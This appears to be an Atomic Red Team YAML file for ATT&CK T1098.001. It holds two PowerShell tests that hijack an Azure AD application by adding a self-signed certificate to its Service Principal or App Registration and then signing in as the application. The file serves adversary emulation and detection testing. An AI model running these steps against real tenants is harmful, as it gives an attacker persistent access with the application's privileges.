attack_technique: T1098.001
display_name: Additional Cloud Credentials
atomic_tests:
- name: Azure AD Application Hijacking - Service Principal
  auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
  display_name: 'Azure AD Service Principal Hijacking'
  description: |
    Add a certificate to an Application through its Service Principal. Certificate will be link to the appdId.
    The certificate can be used to authenticate as the application and benefits from its access.
    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Azure AD username
      type: String
    password:
      description: Azure AD password
      type: String
    application:
      description: Targeted Application
      type: String
      default: "SuperApplication"
    CertificatePassword:
      description: Password of the new certificate
      type: string
      default: Passw0rd
    PathToCert:
      description: Path of the new certificate, locally stored 
      type: string
      default: $env:TEMP
  executor:
    command: |
      $User = "#{username}"
      $App_name = "#{application}"
      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Pword
      Connect-AzureAD -Credential $Credential

      $sp = Get-AzureADServicePrincipal -Searchstring $App_name
      $notAfter = (Get-Date).AddMonths(6) 
      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\LocalMachine\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
      $pwd = ConvertTo-SecureString -String #{CertificatePassword} -Force -AsPlainText
      Export-PfxCertificate -cert "cert:\localmachine\my\$thumb" -FilePath #{PathToCert}'\'#{application}'.pfx' -Password $pwd

      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(#{PathToCert}'\'#{application}'.pfx', $pwd)
      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -CustomKeyIdentifier "Test123" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $notAfter

      $tenant=Get-AzureADTenantDetail
      Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId  $sp.AppId -CertificateThumbprint $thumb
      Get-AzureADCurrentSessionInfo

    cleanup_command: |
      Disconnect-AzureAD
      rm #{PathToCert}'\'#{application}'.pfx'
    name: powershell
    elevation_required: false

- name: Azure AD Application Hijacking - App Registration
  auto_generated_guid: a12b5531-acab-4618-a470-0dafb294a87a
  display_name: 'Azure AD App Registration Hijacking'
  description: |
    Add a certificate to an Application through its App Registration. Certificate will be link to the appdId.
    The certificate can be use to authenticate as the application and benefits from its access.
    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Azure AD username
      type: String
    password:
      description: Azure AD password
      type: String
    application:
      description: Targeted Application 
      type: String
      default: "SuperApplication"
    CertificatePassword:
      description: Password of the new certificate
      type: string
      default: Passw0rd
    PathToCert:
      description: Path of the new certificate, locally stored 
      type: string
      default: $env:TEMP
  executor:
    command: |
      $User = "#{username}"
      $App_name = "#{application}"
      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{username}, $Pword
      Connect-AzureAD -Credential $Credential

      $app = Get-AzureADApplication -Searchstring $App_name
      $notAfter = (Get-Date).AddMonths(6) 
      $thumb = (New-SelfSignedCertificate -DnsName "drumkit.onmicrosoft.com" -CertStoreLocation "cert:\LocalMachine\My"  -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
      $pwd = ConvertTo-SecureString -String #{CertificatePassword} -Force -AsPlainText
      Export-PfxCertificate -cert "cert:\localmachine\my\$thumb" -FilePath #{PathToCert}'\'#{application}'.pfx' -Password $pwd

      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(#{PathToCert}'\'#{application}'.pfx', $pwd)
      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -CustomKeyIdentifier "Test123" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $notAfter

      $tenant=Get-AzureADTenantDetail
      Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId  $app.AppId -CertificateThumbprint $thumb
      Get-AzureADCurrentSessionInfo

    cleanup_command: |
      Disconnect-AzureAD
      rm #{PathToCert}'\'#{application}'.pfx'
    name: powershell
    elevation_required: false
    
